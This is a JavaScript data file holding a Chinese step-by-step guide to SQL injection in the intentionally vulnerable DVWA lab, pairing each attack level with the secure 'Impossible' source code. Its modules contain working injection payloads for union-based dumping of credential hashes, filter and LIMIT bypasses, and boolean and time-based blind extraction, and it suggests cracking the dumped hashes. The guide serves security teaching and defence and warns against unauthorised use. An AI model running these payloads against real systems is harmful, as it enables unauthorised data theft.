// MySQL 学习站 v2 · DVWA 靶场实战手册
// 说明：DVWA 自带 Low / Medium / High / Impossible 四个级别，
//       Impossible 就是安全写法——这正好构成「漏洞 → 修复」的天然对照组。
var DVWA = [
{
 title:"第 0 步 · 把 DVWA 跑起来并确认三个设置",
 meta:"难度 ★☆☆　用时 10 分钟　环境：你已有的 DVWA",
 goal:"确认 DVWA 能访问、数据库已初始化、安全级别切到了 Low。",
 chapters:"对应课程：第 1 章（环境）、实验 1",
 steps:["浏览器打开 DVWA（phpStudy 通常是 http://localhost/dvwa ，XAMPP 是 http://localhost/dvwa ）。",
"顺手确认版本：看浏览器标签页标题，会写着「v1.9」这样的编号。<b>版本不同源码细节会有差异，一切以你实际点开的 View Source 为准。</b>",
"第一次进入先点 <b>Create / Reset Database</b>，把 dvwa 库建好。",
"登录，默认账号 <b>admin / password</b>。",
"左侧菜单点 <b>DVWA Security</b>，级别选 <b>Low</b>，保存。",
"随便进一个模块，页面底部有 <b>View Source</b> 按钮——<b>这是整个手册最重要的按钮</b>，每个模块都要点开看。"],
 code:":: 如果访问 404，先确认 DVWA 放对了位置\n::   phpStudy:  C:\\phpstudy\\WWW\\DVWA   或  D:\\phpstudy_pro\\WWW\\dvwa\n::   XAMPP:     C:\\xampp\\htdocs\\dvwa\n\n:: 数据库连接在 DVWA/config/config.inc.php 里，默认：\n::   db_user = root\n::   db_password = （空，或你 phpStudy 里设的密码）\n::   db_database = dvwa\n\n:: 想快速确认环境，直接访问这两个页面（只读，不改任何东西）：\n::   http://<你的地址>/DVWA/setup.php      → 会显示 PHP 版本和配置文件路径\n::   http://<你的地址>/DVWA/login.php      → 标签页标题里就写着 DVWA 版本号\n\n:: 举个例子（我的 DVWA 实测环境）：\n::   Apache/2.4.23 (Win32)  PHP/5.4.45   DVWA v1.9   路径 C:\\phpstudy\\WWW\\DVWA\n::   注意：v1.9 用的是已废弃的 mysql_* 函数，所以它必须跑在 PHP 5.x 上；\n::         如果你把 PHP 升到 7 以上，v1.9 会直接报错 —— 这是正常现象，不是装坏了。",
 expect:["DVWA 首页能正常打开并登录","左侧菜单能看到 DVWA Security / SQL Injection / SQL Injection (Blind) 等模块","任意模块底部都能找到 View Source 按钮","DVWA Security 页面显示当前级别是 Low"],
 why:"DVWA 的定位是「故意有漏洞的练习环境」，它把「漏洞代码」和「修复代码」都摆在同一页上（Low 对 Impossible）。这正是文档式教程最缺的东西——<b>你不是在想象漏洞，而是在看着它运行</b>。",
 warn:"DVWA 只能装在你自己的电脑上、只对你自己的本地环境使用。不要把它部署到公网服务器，也不要用它去测试任何别人的系统。"
},
{
 title:"认知前提 · 四个级别就是「漏洞 → 修复」的完整对照",
 meta:"难度 ★☆☆　必读　用时 5 分钟",
 goal:"先建立一张总图，后面每个模块都按这张图来学。",
 chapters:"对应课程：第 13-17 章（这一张表就是整门课的实操版）",
 steps:["把下表当成学习地图：每学一个模块，都要走完「打 Low → 看源码 → 打 Medium/High → 看源码 → 打 Impossible → 看源码」。",
"<b>打穿不是目的，看懂源码差异才是。</b>能说出「Low 少做了哪一步、Impossible 补上了哪一步」，这个模块才算学会。",
"学到第 17 章后，再回头把这张表重新过一遍——你会有完全不同的感受。"],
 code:"DVWA 的四个级别对应的防护强度：\n\n  Low         无任何防护，直接拼接 SQL\n              → 对应课程「注入为什么能成立」（第 13 章）\n\n  Medium      加了转义函数，但类型没处理、前端限制可绕过\n              → 对应课程「黑名单不够用、前端校验不算校验」（第 13.6、17.4 节）\n\n  High        加了 LIMIT 1 等限制，但仍是拼接\n              → 对应课程「限制输出不等于防御」（第 14 章）\n\n  Impossible  类型校验 + 预处理 + token 校验\n              → 对应课程「预处理的正确写法」（第 17 章）\n\n一句话：Low 是「错在哪」，Impossible 是「对长什么样」。",
 expect:["你能说清四个级别各自做了什么防护","你能把每个级别对应到课程的具体章节","你不再把「打穿 DVWA」当目标，而是把「讲清源码差异」当目标"],
 why:"很多人打 DVWA 只停留在「Low 能打穿、Impossible 打不动」，然后就结束了。真正的收获在中间那一步：<b>对着两段源码说出「差异在这里」，并解释这个差异为什么能挡住注入</b>。这才是能迁移到真实代码审计里的能力。"
},
{
 title:"模块一 · SQL Injection（Low）完整拖库",
 meta:"难度 ★★☆　用时 30 分钟　环境：DVWA Security = Low",
 goal:"从「输入数字查出用户」一路走到「拖出全部账号和口令哈希」，并且每一步都知道自己在做什么。",
 chapters:"对应课程：第 13 章（判定与闭合）、第 14 章（探列数与 UNION 拖库）",
 steps:["进入 <b>SQL Injection</b> 模块，在输入框填 1 提交，先看正常返回长什么样。",
"填 <b>1'</b> 提交 → 出现 SQL 语法错误 ⇒ <b>说明是字符型注入</b>（引号参与了语法）。",
"填 <b>1' -- </b> 提交 → 恢复正常 ⇒ 说明闭合和注释都成立。",
"探列数：<b>1' ORDER BY 1 -- </b> 正常，<b>1' ORDER BY 2 -- </b> 正常，<b>1' ORDER BY 3 -- </b> 报错 ⇒ 原查询是 2 列。",
"找回显位：<b>1' UNION SELECT 1,2 -- </b> → 页面会显示 1 和 2，记住它们出现在哪个位置。",
"查库表名：把回显位换成 <b>database()</b> 和 <b>version()</b>，确认当前库叫 dvwa。",
"拖数据：<b>1' UNION SELECT user, password FROM users -- </b> → 页面显示出用户名和口令哈希。"],
 code:"-- 每一步的输入（填进 DVWA 的输入框）\n1\n1'\n1' -- \n1' ORDER BY 1 -- \n1' ORDER BY 2 -- \n1' ORDER BY 3 -- \n1' UNION SELECT 1,2 -- \n1' UNION SELECT database(), version() -- \n1' UNION SELECT user, password FROM users -- \n\n-- 一次把全部账号拼成一行（课程第 14.5 节的 GROUP_CONCAT）\n1' UNION SELECT 1, GROUP_CONCAT(CONCAT(user, ':', password)) FROM users -- \n\n-- 想看表名和列名（课程第 14.3 节的 information_schema）\n1' UNION SELECT 1, GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database() -- \n1' UNION SELECT 1, GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='users' -- \n\n-- 注意：URL 里提交时，# 必须写成 %23；用 -- 记得后面要有一个空格",
 expect:["输入 1 正常返回 first name / surname 两列","输入 1' 报 SQL 语法错误（这就是「可注入」的第一个证据）","ORDER BY 3 报错，从而推断出原查询是 2 列","UNION SELECT 1,2 时页面上能看到数字 1 和 2","最后一步能拿到 users 表里的用户名和 32 位口令哈希","把哈希拿到在线 MD5 库或本地工具解一下，能还原出明文（这最能说明拖库的后果）"],
 undo:["DVWA 首页的 Setup / Reset Database 可以把数据库恢复原状"],
 why:"这一整套动作就是课程第 14 章那张「完整拖库链条」的实操版：探列数 → 找回显位 → 查库名 → 查表名 → 查列名 → 拖数据。<b>亲手走一遍之后，你在审计 PHP 代码时看到拼接的 SQL，脑子里会自动浮现出这串 payload。</b>",
 warn:"只在你自己的本地 DVWA 上做。真实网站的一个注入点背后可能是几十万人的数据，未授权测试是刑事犯罪，不是「技术切磋」。"
},
{
 title:"模块二 · 看源码：Low 到底错在哪",
 meta:"难度 ★★☆　用时 15 分钟　环境：SQL Injection 模块",
 goal:"把刚才打穿的过程，和源代码一一对应上——这是从「会用工具」到「能审计代码」的关键一步。",
 chapters:"对应课程：第 13.1（根因）、第 17 章（正确写法）",
 steps:["在 SQL Injection 模块页面底部点 <b>View Source</b>。",
"找到构造 SQL 的那两行，观察变量有没有被处理过。",
"回到页面，把 DVWA Security 切到 <b>Impossible</b>，再次 View Source，对比同一段代码。",
"列出「Impossible 比 Low 多做了什么」，至少说出三点。",
"最后把 Security 切回 Low，继续后面的模块。"],
 code:"// 先确认版本：本手册按 DVWA v1.9 写（页面标题里能看到 v1.9）\n// 版本差异：v1.9 用的是老式 mysql_* 函数，所以它必须跑在 PHP 5.x 上；\n//          较新的 DVWA 改用 mysqli_* 或 PDO，函数名会不一样 —— 以你自己的 View Source 为准\n\n// Low 的源码（v1.9，大意）——问题就在这里\n$id = $_REQUEST[ 'id' ];\n$getid  = \"SELECT first_name, last_name FROM users WHERE user_id = '$id';\";\n$result = mysql_query( $getid ) or die( '<pre>' . mysql_error() . '</pre>' );\n\n// 四个致命点：\n//   ① 输入 $id 直接拼进 SQL，没有任何处理\n//   ② 用 $_REQUEST 接收（GET/POST 都收，攻击面更大）\n//   ③ 输入被引号包裹 ⇒ 字符型注入\n//   ④ 出错时用 mysql_error() 把数据库报错直接打印到页面上 ⇒ 报错注入的温床\n\n// Impossible 的源码（v1.9，大意）——对照着看\ncheckToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );  // ① 防 CSRF\n$id = $_GET[ 'id' ];\nif( is_numeric( $id ) ) {            // ② 类型校验：不是数字直接拒绝\n    $id = intval( $id );             //    并强制转成整数，注入字符被丢弃\n} else {\n    die( 'Invalid ID' );\n}\n$data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );\n$data->bindParam( ':id', $id, PDO::PARAM_INT );      // ③ 参数绑定，结构提前定好（根治）\n$data->execute();\n\n// 差异总结（这几条就是修复清单）：\n//   ① 类型校验 + intval：字符型 payload 全部失效\n//   ② 预处理 + 参数绑定：结构不可被输入改写（根治）\n//   ③ token 校验：防止跨站伪造请求\n//   ④ 报错不再回显：断掉报错注入这条路",
 expect:["你能在 Low 源码里指出「拼接」的那一行","你能说出 Impossible 至少三个差异：类型校验、预处理、token","你能解释「为什么加了类型校验之后，单引号闭合那套 payload 就全都失效了」","你能用一句话概括：Low 把输入当代码，Impossible 把输入当数据"],
 why:"这个模块的价值不在「打」，而在「读」。<b>能对着两段源码说出差异，你才真正拥有了代码审计的能力</b>——而这正是你在 SRC 平台和实习面试里实际会被考的东西。"
},
{
 title:"模块三 · SQL Injection（Medium）：转义函数为什么没用",
 meta:"难度 ★★★　用时 25 分钟　环境：DVWA Security = Medium",
 goal:"理解「加了转义函数却依然能注入」这个反直觉现象，并搞清前端限制为什么不算防御。",
 chapters:"对应课程：第 13.2（字符型 vs 数字型）、第 17.4（不能只靠前端校验）",
 steps:["把 DVWA Security 切到 <b>Medium</b>，进入 SQL Injection。",
"观察：输入框变成了<b>下拉框</b>，只能选 1-5，看起来没法注入。",
"先看源码，注意两件事：输入是用 <b>$_POST</b> 接收的，而且<b>变量没有被引号包裹</b>。",
"再注意它确实调用了 <b>mysql_real_escape_string</b>（v1.9 的老函数）—— 看起来做了防护。",
"绕过前端限制：用开发者工具（F12）把下拉框某个 option 的 value 改成 payload，或者用 Burp / 抓包工具改提交的 post 数据。",
"payload 里<b>不带引号</b>，因为这里是数字型：<b>1 UNION SELECT user, password FROM users -- </b>"],
 code:"// Medium 的源码（v1.9，大意）\n$id = $_POST[ 'id' ];\n$id = mysql_real_escape_string( $id );                   // ← 看起来做了防护\n$getid  = \"SELECT first_name, last_name FROM users WHERE user_id = $id;\";   // ← 但变量没被引号包住！\n$result = mysql_query( $getid );   // 注意：这里去掉了 or die，故意不显示报错\n\n// 为什么转义函数在这里无效：\n//   mysql_real_escape_string 的作用是「转义引号等特殊字符」\n//   而数字型注入根本不用引号 —— 没有引号可转义，函数等于没做事\n//   1 UNION SELECT user, password FROM users -- \n//   这句话里一个单引号都没有，转义函数拦不住任何东西\n\n// 所以「用了转义函数」不等于安全：\n//   它只处理了「引号」这一种危险字符，而危险来自「变量没被引号包住」这个结构问题\n\n-- 绕过前端下拉框（浏览器 F12 控制台里直接改，或者用代理工具改包）\n-- 把表单里 select 的某个 option 的 value 改成你的 payload，再提交\n-- 例如:  <option value=\"1 UNION SELECT user, password FROM users -- \">1</option>\n\n-- 提交后（POST 数据）\nid=1 UNION SELECT user, password FROM users --",
 expect:["你发现输入框变成了下拉框，页面上没法直接输入 payload","你能解释：下拉框是前端限制，改请求就能绕过，所以它不算安全措施","你能指出源码里变量没有被引号包裹（这是数字型注入）","你能说清 mysql_real_escape_string 为什么在这里失效","用改包的方式能成功拖出 users 表数据"],
 why:"这个模块一次性讲透两个高频误区：<b>① 转义函数不是万能的（它只管引号，管不住数字型）；② 前端限制不是安全措施（改个请求就没了）</b>。审计代码时看到「用了 escape 函数就以为安全」，正好是这里要打破的错觉。"
},
{
 title:"模块四 · SQL Injection（High）：LIMIT 1 也挡不住",
 meta:"难度 ★★★　用时 25 分钟　环境：DVWA Security = High",
 goal:"理解「限制输出条数」和「限制注入」是两件不同的事。",
 chapters:"对应课程：第 14 章（UNION 注入）",
 steps:["切到 <b>High</b>，进入 SQL Injection。",
"这次页面分两步：先在第一个页面提交 ID，再点链接进入第二个页面看结果——注意源码里 ID 存在 <b>session</b> 里。",
"看源码，注意 SQL 后面多了一句 <b>LIMIT 1</b>。",
"思考：LIMIT 1 只让原查询返回一行，但 UNION 的结果算不算在这一行里？",
"构造 payload 时<b>把 LIMIT 1 一起注释掉</b>：<b>1' UNION SELECT user, password FROM users -- </b>",
"观察：注释符把后面的 <b>' LIMIT 1;</b> 全部吃掉了，于是 UNION 的结果正常显示。"],
 code:"// High 的源码（大意）\n$id = $_SESSION[ 'id' ];                     // ← ID 来自 session（上一步页面存进去的）\n$query  = \"SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;\";\n                                       // ↑ 多了个 LIMIT 1，看起来限制了输出\n\n-- 绕过思路：用注释把 LIMIT 1 一起吃掉\n1' UNION SELECT user, password FROM users -- \n\n-- 拼出来的实际语句变成：\nSELECT first_name, last_name FROM users WHERE user_id = '1'\n  UNION SELECT user, password FROM users -- ' LIMIT 1;\n--                                        ↑ 从这里往后全被注释掉了\n\n-- 于是 LIMIT 1 失效，UNION 的结果正常返回",
 expect:["你能说出这次 ID 是从 session 取的（上一步页面写入的）","你能指出源码里多了 LIMIT 1","你能用注释符把 LIMIT 1 一起注释掉，并成功拖出数据","你能总结：LIMIT 1 限制的是「原查询返回几行」，不是「注入是否成立」"],
 why:"High 级别最值得学的认知是：<b>限制输出条数≠限制注入</b>。很多开发者以为加个 LIMIT 1 就安全了，实际上它只是控制了正常查询的输出量。防御必须发生在「结构」层面（预处理/白名单），而不是「结果」层面。"
},
{
 title:"模块五 · SQL Injection (Blind)：没回显时怎么把数据「问」出来",
 meta:"难度 ★★★★　用时 40 分钟　环境：DVWA Security = Low → Medium → High",
 goal:"亲手体会布尔盲注和时间盲注——没有数据回显时，靠页面差异和响应时间传递信息。",
 chapters:"对应课程：第 15.1（布尔盲注）、第 15.2（时间盲注）、第 7.5（聚合函数在盲注里的作用）",
 steps:["进入 <b>SQL Injection (Blind)</b> 模块，先随便输入 1，观察返回：它只说「存在」或「不存在」，<b>不显示任何数据</b>。",
"布尔判定：输入 <b>1' AND 1=1 -- </b> 与 <b>1' AND 1=2 -- </b>，对比页面提示是否不同。",
"确认可注入后，开始「问问题」——先问数据库名的长度，再逐位猜字符：<b>1' AND LENGTH(database())=4 -- </b>",
"猜字符用 ASCII 值配合大小比较（二分法收敛更快）：<b>1' AND ASCII(SUBSTRING(database(),1,1))>100 -- </b>",
"时间盲注：输入 <b>1' AND SLEEP(5) -- </b>，观察浏览器是不是明显卡了 5 秒。",
"把条件套进延时函数，就能在完全看不到差异的页面上取数据：<b>1' AND IF(ASCII(SUBSTRING(database(),1,1))>100, SLEEP(3), 0) -- </b>"],
 code:"-- ① 先确认「只有两种状态」\n1' AND 1=1 --        → 提示存在\n1' AND 1=2 --        → 提示不存在\n\n-- ② 布尔盲注：把问题设计成「是/否」\n1' AND LENGTH(database())=4 --                     猜库名长度\n1' AND ASCII(SUBSTRING(database(),1,1))>100 --     猜第 1 个字符的 ASCII 码\n1' AND ASCII(SUBSTRING(database(),1,1))=100 --     精确判断\n-- 二分法：>100 真、>115 假 …… 8 次以内锁定一个字符\n-- 然后 SUBSTRING(...,2,1) 取第二位，循环下去\n\n-- ③ 猜表名（结合 information_schema，课程第 14.3 节）\n1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database() AND table_name='users')>0 -- \n\n-- ④ 时间盲注：完全没有页面差异时靠响应时间\n1' AND SLEEP(5) -- \n1' AND IF(1=1, SLEEP(3), 0) --                      真，卡 3 秒\n1' AND IF(1=2, SLEEP(3), 0) --                      假，立刻返回\n1' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100, SLEEP(3), 0) -- \n\n-- ⑤ Medium 级别是数字型（不带引号），payload 要去掉单引号\n1 AND 1=1\n1 AND SLEEP(5)\n\n-- ⑥ 为什么这事手工做很痛苦：\n--    一个 32 位的口令哈希，逐位猜要几百次请求 —— 所以这是脚本干的活（课程第 15.7 节的 sqlmap）",
 expect:["你能看到 Blind 模块只返回「存在 / 不存在」两种状态","1' AND 1=1 与 1' AND 1=2 的返回不同（布尔盲注成立）","1' AND SLEEP(5) 时浏览器明显卡住约 5 秒（时间盲注成立）","你能用 LENGTH + ASCII + SUBSTRING 猜出 database() 的第一个字符","你能解释：为什么脚本化盲注会产生「大量请求 + 响应时间规律偏长」的日志特征"],
 why:"盲注是「没有回显时怎么把信息传出来」的经典解法，也是课程第 15 章的核心。更进一步的价值在于审计：<b>你在日志里看到大量参数含 SLEEP / IF / SUBSTRING 的请求，或者同一接口被高频访问且响应时间稳定偏长，那基本就是盲注</b>——这正是第 19.4 节列的告警特征。"
},
{
 title:"模块六 · 修复复测：用 Impossible 验证「防御到底成不成立」",
 meta:"难度 ★★★　用时 25 分钟　环境：DVWA Security = Impossible",
 goal:"把前面所有 payload 原样再打一遍，确认它们全部失效，并从源码里找出「是哪一层挡住的」。",
 chapters:"对应课程：第 17 章（预处理）、第 18 章（权限）、第 19 章（审计）",
 steps:["把 DVWA Security 切到 <b>Impossible</b>，回到 SQL Injection 模块。",
"把模块一里那串 payload 逐条重新提交：1'、1' -- 、UNION SELECT……",
"记录每条的结果：是报错、还是返回异常、还是干脆没有反应。",
"点 View Source，找出是哪几步挡住了它们。",
"最后回 SQL Injection (Blind) 的 Impossible 级别重复一遍。",
"<b>写一份对比记录</b>：左边是 payload，右边是 Low 的结果和 Impossible 的结果——这份对照表就是你的作品。"],
 code:"// 复测清单：逐条填结果（Low 能打穿 / Impossible 应该全部失效）\n//  1' \n//  1' -- \n//  1' ORDER BY 3 -- \n//  1' UNION SELECT 1,2 -- \n//  1' UNION SELECT user, password FROM users -- \n//  1' AND SLEEP(5) -- \n\n// Impossible 到底做了什么（对照课程第 17 章）：\n//   ① is_numeric 类型校验  → 不是纯数字直接 die，字符型 payload 全废\n//   ② intval 强制转换        → 输入被洗成整数，注入字符被丢弃\n//   ③ prepare + bindParam    → 结构提前编译，参数只能当值（根治）\n//   ④ user_token 校验        → 防 CSRF，也挡住了直接构造请求\n\n// 复测通过的标准：\n//   所有 payload 都不再返回数据\n//   你能指出「是第 ①②③ 步里的哪一步挡住了这一条」\n\n// 进阶：把课程第 18、19 章的加固清单用到你的 DVWA 环境上\nSHOW GRANTS FOR CURRENT_USER();\nSHOW VARIABLES LIKE 'secure_file_priv';\nSELECT user, host FROM mysql.user WHERE user='root' AND host NOT IN ('localhost','127.0.0.1','::1');",
 expect:["所有 payload 在 Impossible 下都拿不到数据","你能对着源码指出「这一条是被哪一步挡住的」","你产出了一份「payload → Low 结果 → Impossible 结果」的对照表","你能说出类型校验和预处理各自的职责：前者挡住这一类的输入形态，后者根治结构被改写"],
 undo:["如果改了 DVWA 的数据库配置或权限，改回原样即可；DVWA 本身可以用 Setup 重置数据库"],
 tip:"这份对照表的价值远超实验本身：它把「攻击」和「防御」放在同一页上，你既能证明漏洞真实存在，也能证明修复真实有效。<b>这正是做安全的日常工作方式——先证明能打穿，再证明修好了。</b>",
 why:"学完 DVWA 的六个模块，你已经把课程第 13-17 章全部实操过一遍：判定、拖库、源码审计、类型差异、限制绕过、盲注、修复复测。接下来课程第 18-19 章讲的是「超出单个注入点」的加固——权限最小化、配置加固、日志审计，那些需要在真实的数据库服务上练（实验 12）。"
}
];
